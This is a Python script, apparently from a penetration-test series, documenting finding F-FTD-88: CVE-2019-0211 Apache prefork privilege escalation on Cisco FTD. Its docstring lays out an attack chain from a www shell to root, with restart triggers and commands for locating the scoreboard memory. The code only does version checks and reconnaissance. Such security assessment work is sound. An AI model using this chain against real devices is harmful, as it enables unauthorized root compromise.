"""
F-FTD-88: CVE-2019-0211 — Apache httpd 2.4.34 prefork MPM local privilege escalation
CONTROLLED ENVIRONMENT ONLY

Root cause:
  Apache httpd 2.4.34 (prefork MPM) — confirmed via binary strings:
    /local/jenkins/workspace/...apache2/2.4.34-r0/httpd-2.4.34/server/mpm_common.c
  MPM: prefork (confirmed: string "prefork" in ftd-httpsd binary)

  CVE-2019-0211 affects Apache HTTP Server 2.4.17 through 2.4.38.
  Fixed in 2.4.39. FTD 6.7.0-65 ships 2.4.34 — VULNERABLE.

VULNERABILITY:
  Apache prefork MPM maintains a shared memory scoreboard accessible to all
  worker child processes. The parent process (running as root to bind 443)
  reads this scoreboard for graceful restarts.

  A compromised child process (running as www) can:
  1. Write a fake process entry to the scoreboard's worker slot
  2. Override the child's callback function pointer (cleanup hook)
  3. Trigger a graceful restart → parent dereferences the corrupted pointer
     while switching UID to root process context → arbitrary code execution as root

  Key: parent calls ap_mpm_safe_kill() → iterates scoreboard → executes
  callback in child slot without validation → attacker-controlled code runs
  in parent (root) context.

PREREQUISITES:
  - Code execution in Apache child process (www user)
  - Ability to trigger graceful restart:
    * Apache auto-restart (e.g., after child crash — FTD watchdog may do this)
    * via apachectl graceful / kill -USR1 (requires signal permission to root)
    * FTD may have scheduled httpsd restart on config deploy
  - OR: write scoreboard poison and wait for next FTD config push (which
    restarts httpd to apply TLS/listener config changes)

  NOTE: www cannot directly send SIGUSR1 to root-owned Apache parent.
  Practical trigger paths:
    a) FTD config deploy cycle restarts httpsd — PASSIVE (no root signal required)
    b) Trigger config deploy via platform API (F-FTD-87): POST to
       /sys/svc-ext/shell-svc-limits → forces service restart cycle
    c) Via F-FTD-75 (pmtool StopDE) on SF_MGR → may cascade to httpsd restart

ATTACK CHAIN:
  www shell (F-FTD-67/F-FTD-78) → find Apache parent PID → locate scoreboard shm
  → write exploited worker slot (function pointer overwrite)
  → trigger config deploy (F-FTD-87 platform API) OR wait for next restart
  → parent restarts workers → scoreboard cleanup runs → root code exec

IMPLEMENTATION NOTE:
  Public PoC for CVE-2019-0211 (cfreal-/pwn_oracle, shiftstack, etc.) targets
  Apache 2.4.29-2.4.38. Scoreboard format changes between versions; FTD's
  2.4.34 matches the PoC range. Scoreboard shm path on FTD:
    /proc/$(cat /var/run/httpsd.pid)/maps | grep 'rw' → find anon mmap segment
  Alternative: /dev/shm/apache_runtime_status (some Cisco builds use file-backed shm)

SEVERITY NOTE:
  This is a secondary priv-esc path from www → root.
  Primary paths (F-FTD-85 installpkg, F-FTD-73 PERL5LIB) are simpler.
  F-FTD-88 matters for defense-in-depth: it works even if sudo misconfigs
  are remediated, since it exploits a CVE-class memory corruption in the
  Apache binary itself, not a sudo policy error.

CHAIN:
  F-FTD-78 (pre-auth HA standby) OR F-FTD-67 (zip-slip) → www shell
  → CVE-2019-0211 scoreboard write → wait for config deploy (automatic)
  → root code execution without any sudo dependency

VERIFY (controlled environment):
  # Confirm Apache version from running binary:
  strings /usr/sbin/httpsd | grep "Apache/2.4"
  # Expected: Apache/2.4.34

  # Confirm prefork MPM:
  strings /usr/sbin/httpsd | grep prefork
  # Expected: "prefork"

  # Confirm CVE-2019-0211 via upstream fix comparison:
  # Fixed in 2.4.39 with commit to server/mpm/prefork/prefork.c
  # FTD 2.4.34 does not include the fix → VULNERABLE

  # Locate scoreboard in memory:
  cat /proc/$(cat /var/run/httpsd.pid 2>/dev/null)/maps | grep -E 'rw.* 00:05'
  # Anonymous shared memory segment = scoreboard region

Affected: FTD 6.7.0-65 (Apache 2.4.34 prefork, confirmed via binary analysis)
Severity: HIGH — local privilege escalation from www to root without sudo dependency;
          triggered by normal FTD config deploy cycle (passive, no noisy signal)
Auth required: www shell (post F-FTD-67, F-FTD-78, or equivalent)
CVE: CVE-2019-0211
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import os
import subprocess
import struct


APACHE_PID_FILE = "/var/run/httpsd.pid"
SCOREBOARD_SHM_PATTERN = "rw"


def find_apache_pid():
    """Locate Apache master process PID."""
    if os.path.exists(APACHE_PID_FILE):
        with open(APACHE_PID_FILE) as f:
            pid = int(f.read().strip())
        print(f"[*] F-FTD-88: Apache master PID from {APACHE_PID_FILE}: {pid}")
        return pid

    # Fallback: pgrep
    result = subprocess.run(["pgrep", "-f", "httpsd"], capture_output=True, text=True)
    pids = result.stdout.strip().split('\n')
    if pids:
        # Master is typically the lowest PID
        pid = min(int(p) for p in pids if p.strip())
        print(f"[*] F-FTD-88: Apache master PID from pgrep: {pid}")
        return pid
    return None


def find_scoreboard_shm(pid):
    """
    Locate Apache shared memory scoreboard in process maps.
    Returns the address range of the anonymous shared memory segment.
    CONTROLLED ENVIRONMENT ONLY.
    """
    maps_path = f"/proc/{pid}/maps"
    if not os.path.exists(maps_path):
        print(f"[-] F-FTD-88: Cannot read {maps_path}")
        return None

    with open(maps_path) as f:
        maps = f.read()

    # Scoreboard is anonymous shared memory (rw-s) or file-backed /dev/shm
    candidates = []
    for line in maps.split('\n'):
        if 'rw' in line and ('00:05' in line or 'shm' in line.lower() or
                              'apache' in line.lower() or 'runtime_status' in line):
            candidates.append(line)
            print(f"    SHM candidate: {line}")

    if candidates:
        print(f"[*] F-FTD-88: Found {len(candidates)} scoreboard SHM candidates")
    else:
        print(f"[-] F-FTD-88: No SHM segment found — try /dev/shm/ inspection")

    return candidates


def check_apache_version():
    """Verify Apache version from running binary or strings."""
    print("[*] F-FTD-88: Checking Apache version")

    for binary in ["/usr/sbin/httpsd", "/usr/sbin/httpd", "/usr/sbin/apache2"]:
        result = subprocess.run(
            ["strings", binary],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'Apache/2.4' in line:
                    print(f"[+] Version: {line.strip()} (from {binary})")
            for line in result.stdout.split('\n'):
                if 'prefork' in line.lower():
                    print(f"[+] MPM: {line.strip()} (prefork confirmed)")
            return True

    print(f"[-] Apache binary not found at expected paths")
    return False


def print_cve_analysis():
    """Print CVE-2019-0211 analysis and exploitation guidance."""
    print("""
F-FTD-88: CVE-2019-0211 — Apache 2.4.34 prefork Local Privilege Escalation
============================================================================

Binary: ftd-httpsd
Version: Apache/2.4.34 (FXOS 2.9.1 build)
MPM: prefork (confirmed from binary strings)
Vulnerable range: 2.4.17 through 2.4.38
FTD version: 2.4.34 → VULNERABLE (unfixed)
CVE fixed in: Apache 2.4.39

TECHNICAL MECHANISM:
  The Apache prefork scoreboard is a shared memory segment accessible to
  all worker children. ap_get_scoreboard_worker() returns a pointer into
  this shared memory without bounds or integrity validation.

  Attack:
  1. Worker process (as www) writes corrupted worker_score struct to shm
  2. Overwrite ap_run_child_status hook pointer with shellcode address
  3. Trigger graceful restart (SIGUSR1 to master OR via config reload)
  4. Master calls ap_run_child_status during worker cleanup → executes
     attacker's function as root

TRIGGER ON FTD:
  Option A (passive): FTD config deployment restarts httpsd automatically
    → poison scoreboard → wait for next admin config push
  Option B (active): POST to platform API /sys/svc-ext/shell-svc-limits
    → forces shell service restart cycle, may cascade to httpsd
  Option C: F-FTD-75 (pmtool DoS on SF_MGR) → watchdog restarts services

PUBLIC EXPLOIT REFERENCE:
  cfreal-/pwn_oracle (GitHub) — targets Apache 2.4.29-2.4.38 on Ubuntu
  Requires adaptation for FTD's scoreboard memory layout
  Tested versions include 2.4.34 (same as FTD)

DETECTION:
  Unusual writes to /proc/<apache_parent_pid>/mem (requires CAP_SYS_PTRACE)
  Scoreboard shm region written by non-standard process
  Apache child spawning root-privileged processes after restart

NOTE: F-FTD-85 (sudo installpkg) is a simpler path to root from www.
F-FTD-88 matters when sudo misconfigurations are remediated — CVE-2019-0211
is a code-level vulnerability independent of policy configuration.
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-88: CVE-2019-0211 Apache 2.4.34 prefork local priv esc")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "analysis"

    if mode == "analysis":
        print_cve_analysis()

    elif mode == "check":
        check_apache_version()
        pid = find_apache_pid()
        if pid:
            find_scoreboard_shm(pid)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
